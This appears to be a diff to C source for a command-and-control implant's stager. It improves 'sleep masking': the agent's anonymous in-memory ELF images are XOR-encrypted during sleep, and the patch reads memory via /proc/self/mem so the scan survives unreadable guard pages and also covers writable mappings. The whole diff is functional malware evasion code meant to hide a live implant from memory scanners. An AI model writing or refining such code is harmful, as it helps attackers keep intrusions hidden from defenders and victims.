@@ -25,6 +25,8 @@
 #include <stdint.h>
 
 #define MASK_KEY_LEN 32
+/* The stager is freestanding and has no errno.h. */
+#define MASK_EINTR 4
 /* Generous enough for a heavily loaded process; truncation leaves mappings
  * untouched rather than corrupting the map list. */
 #define MASK_MAX_MAPS 2048
@@ -45,6 +47,24 @@ struct mask_scratch {
   struct c2_map maps[MASK_MAX_MAPS];
   struct c2_map ranges[MASK_MAX_RANGES];
 };
+
+/* Read from this process's address space without dereferencing it. A VMA can be
+ * reported readable while its first page is not: glibc merges a thread stack's
+ * unreadable guard page into the reported stack VMA. A load there takes the
+ * process down, while /proc/self/mem reports the same read as an error. */
+static int mask_read_mem(int fd, uintptr_t addr, void *buf, size_t len) {
+  size_t off = 0;
+  while (off < len) {
+    long n = syscall4(SYS_pread64, (long)fd, (long)((uint8_t *)buf + off),
+                      (long)(len - off), (long)(addr + off));
+    if (n == -MASK_EINTR)
+      continue;
+    if (n <= 0)
+      return 0;
+    off += (size_t)n;
+  }
+  return 1;
+}
 
 static int read_full(int fd, void *buf, size_t len) {
   size_t off = 0;
@@ -124,6 +144,10 @@ static uint64_t rd64(const uint8_t *p) {
   return (uint64_t)rd32(p) | ((uint64_t)rd32(p + 4) << 32);
 }
 
+/* One program header is at most 56 bytes (ELF64); a larger entry size is
+ * rejected rather than given a bigger buffer. */
+#define MASK_PH_BUF 64
+
 struct mask_elf {
   uintptr_t base;
   uintptr_t span;
@@ -139,9 +163,16 @@ struct mask_elf {
   size_t nsegs;
 };
 
-/* Parse the anonymous ELF at `base` and collect its PT_LOAD segments. */
-static int elf_open(uintptr_t base, uintptr_t map_end, struct mask_elf *e) {
-  const uint8_t *eh = (const uint8_t *)base;
+/* Parse the anonymous ELF at `base` and collect its PT_LOAD segments. Every
+ * read goes through /proc/self/mem, so an unreadable page inside the mapping
+ * ends the scan instead of faulting. */
+static int elf_open(int fd, uintptr_t base, uintptr_t map_end,
+                    struct mask_elf *e) {
+  uint8_t eh[64];
+  size_t map_len = (size_t)(map_end - base);
+  if (map_len < sizeof(eh) || fd < 0 ||
+      !mask_read_mem(fd, base, eh, sizeof(eh)))
+    return 0;
   if (eh[0] != 0x7f || eh[1] != 'E' || eh[2] != 'L' || eh[3] != 'F')
     return 0;
   if (eh[4] != 1 && eh[4] != 2)
@@ -158,23 +189,22 @@ static int elf_open(uintptr_t base, uintptr_t map_end, struct mask_elf *e) {
   e->phentsize = e->elf64 ? rd16(eh + 54) : rd16(eh + 42);
   e->phnum = e->elf64 ? rd16(eh + 56) : rd16(eh + 44);
   size_t min_ph = e->elf64 ? 56u : 32u;
-  if (e->phentsize < min_ph || e->phnum == 0 || e->phnum > MASK_MAX_PHNUM)
+  if (e->phentsize < min_ph || e->phentsize > MASK_PH_BUF || e->phnum == 0 ||
+      e->phnum > MASK_MAX_PHNUM)
     return 0;
 
   uint64_t phbytes = (uint64_t)e->phnum * e->phentsize;
-  if (e->phoff > (uint64_t)UINTPTR_MAX || phbytes > (uint64_t)UINTPTR_MAX)
-    return 0;
-  uintptr_t phstart = base + (uintptr_t)e->phoff;
-  if (phstart < base || phstart + (uintptr_t)phbytes < phstart ||
-      phstart + (uintptr_t)phbytes > map_end)
+  if (e->phoff > (uint64_t)map_len || phbytes > (uint64_t)map_len - e->phoff)
     return 0;
 
   e->bias = type == MASK_ET_DYN ? base : 0;
   uintptr_t max_end = 0;
   e->nsegs = 0;
+  uint8_t ph[MASK_PH_BUF];
   for (uint16_t i = 0; i < e->phnum; i++) {
-    const uint8_t *ph =
-        (const uint8_t *)(phstart + (uintptr_t)i * e->phentsize);
+    uintptr_t off = (uintptr_t)e->phoff + (uintptr_t)i * e->phentsize;
+    if (!mask_read_mem(fd, base + off, ph, e->phentsize))
+      return 0;
     if (rd32(ph) != MASK_PT_LOAD)
       continue;
     uint64_t vaddr = e->elf64 ? rd64(ph + 16) : rd32(ph + 8);
@@ -322,29 +352,35 @@ static size_t find_ranges(struct mask_scratch *sc, uintptr_t keep_start,
     }
   }
 
-  /* Every anonymous ELF image: the live agent and any decompressed copy
-   * malasada left behind. Adding all PT_LOAD mappings, not just the header
-   * mapping, is what makes the r-xp code segment actually masked. Only
-   * read-only mappings are inspected: a thread stack is writable and glibc
-   * can merge its unreadable guard page into the stack VMA, so a load at that
-   * base faults even where the mapping is reported readable. Every in-memory
-   * image maps its header segment read-only. */
-  for (size_t i = 0; i < nmaps; i++) {
+  /* Every anonymous ELF image, writable mappings included: a loader that maps
+   * the image's segments itself can leave the header page writable. Magic is
+   * read through /proc/self/mem because a VMA can be reported readable while
+   * its first page is not: glibc merges a thread stack's unreadable guard page
+   * into the stack VMA, and a load at the base would take the process down.
+   * Adding every PT_LOAD mapping, not just the header mapping, is what makes
+   * the r-xp code segment actually masked. */
+  int memfd = open("/proc/self/mem", O_RDONLY, 0);
+  for (size_t i = 0; memfd >= 0 && i < nmaps; i++) {
     if (!maps[i].anonymous || !(maps[i].prot & PROT_READ) ||
-        (maps[i].prot & PROT_WRITE) || maps[i].end - maps[i].start < 4)
+        maps[i].end - maps[i].start < 64)
       continue;
-    const uint8_t *m = (const uint8_t *)maps[i].start;
-    if (m[0] != 0x7f || m[1] != 'E' || m[2] != 'L' || m[3] != 'F')
+    uint8_t magic[4];
+    if (!mask_read_mem(memfd, maps[i].start, magic, sizeof(magic)))
+      continue;
+    if (magic[0] != 0x7f || magic[1] != 'E' || magic[2] != 'L' ||
+        magic[3] != 'F')
       continue;
     if (map_excluded(&maps[i], fs_base, gs_base, code_probe, code_end))
       continue;
     struct mask_elf image;
-    if (!elf_open(maps[i].start, maps[i].end, &image))
+    if (!elf_open(memfd, maps[i].start, maps[i].end, &image))
       continue;
     n = add_image_ranges(sc, &image, nmaps, keep_start, keep_end, scratch_start,
                          scratch_end, fs_base, gs_base, code_probe, code_end,
                          n);
   }
+  if (memfd >= 0)
+    close(memfd);
   return n;
 }
 
@@ -410,7 +446,7 @@ int stager_mask_provider_sleep(unsigned seconds, uintptr_t probe,
   long rc;
   do {
     rc = syscall2(SYS_nanosleep, (long)&ts, (long)&ts);
-  } while (rc == -4);
+  } while (rc == -MASK_EINTR);
 
   xor_ranges(ranges, n, key);
   zero_key(key, sizeof(key));
